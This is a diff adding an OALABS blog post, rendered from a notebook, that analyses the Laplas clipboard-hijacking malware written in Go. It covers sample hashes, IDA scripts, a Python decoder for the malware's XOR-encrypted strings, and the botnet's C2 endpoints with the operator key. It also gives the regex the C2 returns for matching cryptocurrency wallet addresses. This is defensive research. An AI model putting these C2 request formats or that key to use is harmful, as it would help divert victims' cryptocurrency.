@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Laplace Clipper | OALABS Research</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="Laplace Clipper" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Taking a look at this GOLang clipboard stealer" />
+<meta property="og:description" content="Taking a look at this GOLang clipboard stealer" />
+<link rel="canonical" href="https://research.openanalysis.net/golang/laplace/python/research/ida/goresym/alphagolang/2022/11/27/laplace.html" />
+<meta property="og:url" content="https://research.openanalysis.net/golang/laplace/python/research/ida/goresym/alphagolang/2022/11/27/laplace.html" />
+<meta property="og:site_name" content="OALABS Research" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-11-27T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Laplace Clipper" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-11-27T00:00:00-06:00","datePublished":"2022-11-27T00:00:00-06:00","description":"Taking a look at this GOLang clipboard stealer","headline":"Laplace Clipper","mainEntityOfPage":{"@type":"WebPage","@id":"https://research.openanalysis.net/golang/laplace/python/research/ida/goresym/alphagolang/2022/11/27/laplace.html"},"url":"https://research.openanalysis.net/golang/laplace/python/research/ida/goresym/alphagolang/2022/11/27/laplace.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://research.openanalysis.net/feed.xml" title="OALABS Research" /><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
+
+<script>
+function wrap_img(fn) {
+    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
+        var elements = document.querySelectorAll(".post img");
+        Array.prototype.forEach.call(elements, function(el, i) {
+            if (el.getAttribute("title") && (el.className != "emoji")) {
+                const caption = document.createElement('figcaption');
+                var node = document.createTextNode(el.getAttribute("title"));
+                caption.appendChild(node);
+                const wrapper = document.createElement('figure');
+                wrapper.className = 'image';
+                el.parentNode.insertBefore(wrapper, el);
+                el.parentNode.removeChild(el);
+                wrapper.appendChild(el);
+                wrapper.appendChild(caption);
+            }
+        });
+    } else { document.addEventListener('DOMContentLoaded', fn); }
+}
+window.onload = wrap_img;
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function(){
+    // add link icon to anchor tags
+    var elem = document.querySelectorAll(".anchor-link")
+    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
+    });
+</script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">OALABS Research</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/search/">Search</a><a class="page-link" href="/categories/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Laplace Clipper</h1><p class="page-description">Taking a look at this GOLang clipboard stealer</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2022-11-27T00:00:00-06:00" itemprop="datePublished">
+        Nov 27, 2022
+      </time>
+       • <span class="read-time" title="Estimated read time">
+    
+    
+      3 min read
+    
+</span></p>
+
+    
+      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
+      
+        <a class="category-tags-link" href="/categories/#golang">golang</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#laplace">laplace</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#python">python</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#research">research</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#ida">ida</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#goresym">goresym</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#alphagolang">alphagolang</a>
+        
+      
+      </p>
+    
+
+    
+      
+        <div class="pb-5 d-flex flex-justify-left">
+            <div class="px-2">
+                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
+                </a>
+            </div>
+          <div class="px-2">
+
+    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2022-11-27-laplace.ipynb" role="button" target="_blank">
+<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
+    </a>
+</div>
+
+          
+          
+          
+        </div>
+      </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h2"><a href="#Overview">Overview </a></li>
+<li class="toc-entry toc-h2"><a href="#Panel">Panel </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#Samples">Samples </a></li>
+<li class="toc-entry toc-h3"><a href="#References">References </a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#Analysis">Analysis </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#GO-Analysis-Workflow">GO Analysis Workflow </a></li>
+<li class="toc-entry toc-h3"><a href="#GO-String-Formatting">GO String Formatting </a></li>
+<li class="toc-entry toc-h3"><a href="#GO-Calling-Convention-and-IDA-7.5">GO Calling Convention and IDA 7.5 </a></li>
+<li class="toc-entry toc-h3"><a href="#Laplas-String">Laplas String </a></li>
+<li class="toc-entry toc-h3"><a href="#C2-URLs">C2 URLs </a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#Regex">Regex </a></li>
+<li class="toc-entry toc-h4"><a href="#Get">Get </a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul><!--
+#################################################
+### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
+#################################################
+# file to edit: _notebooks/2022-11-27-laplace.ipynb
+-->
+
+<div class="container" id="notebook-container">
+        
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Overview">
+<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
+</h2>
+<p><img src="https://i0.wp.com/blog.cyble.com/wp-content/uploads/2022/11/Figure-3-%E2%80%93-Laplas-Clipper-advertisement-used-by-TA-on-the-dark-web-forum-1.jpg" alt=""></p>
+<p>According to <a href="https://blog.cyble.com/2022/11/02/new-laplas-clipper-distributed-by-smokeloader/">cyble</a> <strong>laplas</strong> is a clipboard hijacker that is sold openly on forums. This sample of Laplas is written in <strong>GOLang</strong>, but there is also a <strong>.NET</strong> build.</p>
+<p>According to the same blog the malware calls out to its C2 to get a list of regexes to use for clipboard hijacking.</p>
+<blockquote>
+<p>The malware uses GetRegex() function to get all the regex patterns from the C&amp;C server. This function calls SendRequest() function internally, which forms the below URL that downloads the regex pattern to identify the victim’s cryptocurrency wallet address.
+<code>hxxp[:]//clipper[.]guru/bot/regex?key=afc950a4a18fd71c9d7be4c460e4cb77d0bcf29a49d097e4e739c17c332c3a34</code></p>
+<h2 id="Panel">
+<a class="anchor" href="#Panel" aria-hidden="true"><span class="octicon octicon-link"></span></a>Panel<a class="anchor-link" href="#Panel"> </a>
+</h2>
+<p>This stealer has poor OPSEC and the panel is openly available on the web at <code>https://laplas[.]app/</code>. Potential users are encouraged to create an account and purchase access to the bot.</p>
+</blockquote>
+<p><img src="https://i.imgur.com/OJ0HQLY.png" alt=""></p>
+<p>The developer also has a telegram channel at <code>https://t[.]me/LAPLAS_CLIPPER_NEWS</code>.</p>
+<p><img src="https://i.imgur.com/67MCyWE.png" alt=""></p>
+<h3 id="Samples">
+<a class="anchor" href="#Samples" aria-hidden="true"><span class="octicon octicon-link"></span></a>Samples<a class="anchor-link" href="#Samples"> </a>
+</h3>
+<p>Packed: <code>81e9eefec051e50a819e76fa1ec2f088c2e8c5de677537838193cf6c2e5c7584</code> <a href="https://bazaar.abuse.ch/sample/81e9eefec051e50a819e76fa1ec2f088c2e8c5de677537838193cf6c2e5c7584/">malware bazaar</a>
+Unpacked:<code>f341ad891d445c745f10b4861a5c273abf7a38a0bd85168e7e6528e6b5c0141d</code> <a href="https://malshare.com/sample.php?action=detail&amp;hash=f341ad891d445c745f10b4861a5c273abf7a38a0bd85168e7e6528e6b5c0141d">malshare</a></p>
+<h3 id="References">
+<a class="anchor" href="#References" aria-hidden="true"><span class="octicon octicon-link"></span></a>References<a class="anchor-link" href="#References"> </a>
+</h3>
+<ul>
+<li>JoeSandbox extracted c2 <code>http://clipper.guru/bot/online</code> <a href="https://www.joesandbox.com/analysis/754720/0/html">link</a>
+</li>
+<li><a href="https://blog.cyble.com/2022/11/02/new-laplas-clipper-distributed-by-smokeloader/">cyble blog describing laplas</a></li>
+<li><a href="https://github.com/SentineLabs/AlphaGolang">AlphaGolang IDA plugin</a></li>
+<li><a href="https://github.com/mandiant/GoReSym">GoReSym</a></li>
+</ul>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Analysis">
+<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
+</h2>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="GO-Analysis-Workflow">
+<a class="anchor" href="#GO-Analysis-Workflow" aria-hidden="true"><span class="octicon octicon-link"></span></a>GO Analysis Workflow<a class="anchor-link" href="#GO-Analysis-Workflow"> </a>
+</h3>
+<p>We are only using IDA 7.5 so we don't have a lot of the fancy GO features in the newer versions of IDA. We are mainly relying on IDA plugins to fix up the GO binary.</p>
+<ol>
+<li>Run AlphaGolang scripts (1) and (2) to label the statically linked GO runtime and library code</li>
+<li>Run GoReSym and imported the results with their IDA script (not sure what this did?)</li>
+<li>Run AlphaGolang script (4) to fix up the string refs ... this only sort of works</li>
+<li>
+<em>Optional</em> mark the <code>.data</code> section with the string references as readble only (constant) to force Hex-Rays to show the string literals... we also need to uncheck the <code>Print only constant string literals</code> in the Hex-Rays options. This will now show the string refs. <a href="https://hex-rays.com/blog/igors-tip-of-the-week-56-string-literals-in-pseudocode/">ref</a>
+</li>
+<li>Strings are not null terminated this means that we need to force the string size manually or IDA will assume a giant blob of ascii text is the string. <strong>There should be a better way</strong> but for now we just made a terrible one-off script.</li>
+</ol>
+<h3 id="GO-String-Formatting">
+<a class="anchor" href="#GO-String-Formatting" aria-hidden="true"><span class="octicon octicon-link"></span></a>GO String Formatting<a class="anchor-link" href="#GO-String-Formatting"> </a>
+</h3>
+<p>Go strings use the following struct.</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="nc">go_string</span><span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">string_buff</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">string_len</span><span class="p">;</span> 
+
+<span class="p">}</span>
+</pre></div>
+<p>The following terrible script can be used to manually force the proper string length for the GO strings references in the <code>.data</code> section. The <code>start</code> and <code>end</code> are used to mark the start and end of the GO strings table (barf heuristic to check if it's a legit string or not). This should probably be replaced and integrated into the GO scipts above.</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">make_string</span><span class="p">(</span><span class="n">ptr</span><span class="p">):</span>
+    <span class="n">start</span> <span class="o">=</span> <span class="mh">0x0069E954</span>
+    <span class="n">end</span> <span class="o">=</span> <span class="mh">0x006B34FC</span>
+    <span class="n">str_len</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="o">.</span><span class="n">get_32bit</span><span class="p">(</span><span class="n">ptr</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">str_ptr</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="o">.</span><span class="n">get_32bit</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">start</span> <span class="o">&lt;=</span> <span class="n">str_ptr</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">:</span>
+        <span class="n">ida_bytes</span><span class="o">.</span><span class="n">create_strlit</span><span class="p">(</span><span class="n">str_ptr</span><span class="p">,</span> <span class="n">str_len</span><span class="p">,</span> <span class="n">STRTYPE_C</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">ptr</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x0087B804</span><span class="p">,</span> <span class="mh">0x087CC4F</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
+    <span class="n">make_string</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span>
+</pre></div>
+<h3 id="GO-Calling-Convention-and-IDA-7.5">
+<a class="anchor" href="#GO-Calling-Convention-and-IDA-7.5" aria-hidden="true"><span class="octicon octicon-link"></span></a>GO Calling Convention and IDA 7.5<a class="anchor-link" href="#GO-Calling-Convention-and-IDA-7.5"> </a>
+</h3>
+<p>There is no good way for IDA 7.5 to handle multiple return values (used by GO) in the Hex-Rays decompiler. Though later versions of IDA support a custom <code>__usercall</code> notation to handle this.</p>
+<ul>
+<li><a href="https://hex-rays.com/blog/igors-tip-of-the-week-107-multiple-return-values/">Igor’s tip of the week #107: Multiple return values</a></li>
+<li><a href="https://reverseengineering.stackexchange.com/questions/18305/how-to-specify-stack-based-return-values-in-ida-pro-golang">Stack-based return values in down't work in IDA 7.5</a></li>
+</ul>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Laplas-String">
+<a class="anchor" href="#Laplas-String" aria-hidden="true"><span class="octicon octicon-link"></span></a>Laplas String<a class="anchor-link" href="#Laplas-String"> </a>
+</h3>
+</div>
+</div>
+</div>
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="s1">'FxgdBAQRBloTAQYB'</span>
+<span class="n">data_enc</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">key</span> <span class="o">=</span> <span class="mh">0x74</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data_enc</span><span class="p">:</span>
+    <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+    
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+
+
+<div class="output_text output_subarea output_execute_result">
+<pre>b'clipper.guru'</pre>
+</div>
+
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">data_enc</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data_enc</span><span class="p">:</span>
+        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+
+
+
+<span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="s1">'FRcRQE1GEU1CQkVGRkdAQE1DTEYSFxdMRE1CEBdCERJCRkxNREdGEERMEERHFUMWRBVNRkVDTUJGRhdHQRYQFg=='</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="s1">'FxgdBAQRBloTAQYB'</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="s1">'Hh0XIDI2FQIHGQ=='</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="s1">'ByY5HxE2BhgsMFoEHRA='</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="s1">'JDoXDho4Az05GFoRDBE='</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+<div class="output_subarea output_stream output_stdout output_text">
+<pre>b'ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb'
+b'clipper.guru'
+b'jicTFBavsm'
+b'sRMkeBrlXD.pid'
+b'PNcznLwIMl.exe'
+</pre>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>The first string is the KEY that is used to ID the botnet operator and the second is the the C2 host (the botnet is centrally hosted so encryptiing this seems silly).</p>
+<h3 id="C2-URLs">
+<a class="anchor" href="#C2-URLs" aria-hidden="true"><span class="octicon octicon-link"></span></a>C2 URLs<a class="anchor-link" href="#C2-URLs"> </a>
+</h3>
+<h4 id="Regex">
+<a class="anchor" href="#Regex" aria-hidden="true"><span class="octicon octicon-link"></span></a>Regex<a class="anchor-link" href="#Regex"> </a>
+</h4>
+<p>The regex endpoint is used to pull down a list of regexes used to replace clipboard data.</p>
+<p><code>http[:]//clipper[.]guru/bot/regex?key=ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb</code></p>
+<p>Response</p>
+
+<pre><code>^(?:(1[1-9A-HJ-NP-Za-km-z]{33})|(3[1-9A-HJ-NP-Za-km-z]{33})|(bc1q[023456789acdefghjklmnpqrstuvwxyz]{38,58})|(q[a-z0-9]{41})|(p[a-z0-9]{41})|(L[a-km-zA-HJ-NP-Z1-9]{33})|(M[a-km-zA-HJ-NP-Z1-9]{33})|(ltc1q[a-km-zA-HJ-NP-Z1-9]{38})|(0x[a-fA-F0-9]{40})|(D[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32})|(4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})|(8[0-9AB][1-9A-HJ-NP-Za-km-z]{93})|(r[0-9a-zA-Z]{33})|(t1[a-km-zA-HJ-NP-Z1-9]{33})|(X[1-9A-HJ-NP-Za-km-z]{33})|(ronin:[a-fA-F0-9]{40})|(T[A-Za-z1-9]{33})|(http[s]*:\/\/steamcommunity.com\/tradeoffer\/new\/\?partner=([0-9]+)&amp;token=([a-zA-Z0-9]+))|(tz[1-3][1-9A-HJ-NP-Za-km-z]{33})|(addr1[a-z0-9]+)|(cosmos1[a-z0-9]{38})|(R[a-zA-Z0-9]{33})|([A-Z2-7]{58})|([1-9A-HJ-NP-Za-km-z]{44}))</code></pre>
+<h4 id="Get">
+<a class="anchor" href="#Get" aria-hidden="true"><span class="octicon octicon-link"></span></a>Get<a class="anchor-link" href="#Get"> </a>
+</h4>
+<p>The get endpoint is used to get attacker controled data to replace the intercepted clipboard data. The clipboard data is sent in the <code>address</code> parameter.</p>
+<p><code>http[:]//clipper[.]guru/bot/get?address=https%3A%2F%2Fsteamcommunity.com%2Ftradeoffer%2Fnew%2F%3Fpartner%3D482147969%26token%3Db&amp;key=ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb</code></p>
+
+</div>
+</div>
+</div>
+</div>
+
+
+
+  </div><a class="u-url" href="/golang/laplace/python/research/ida/goresym/alphagolang/2022/11/27/laplace.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
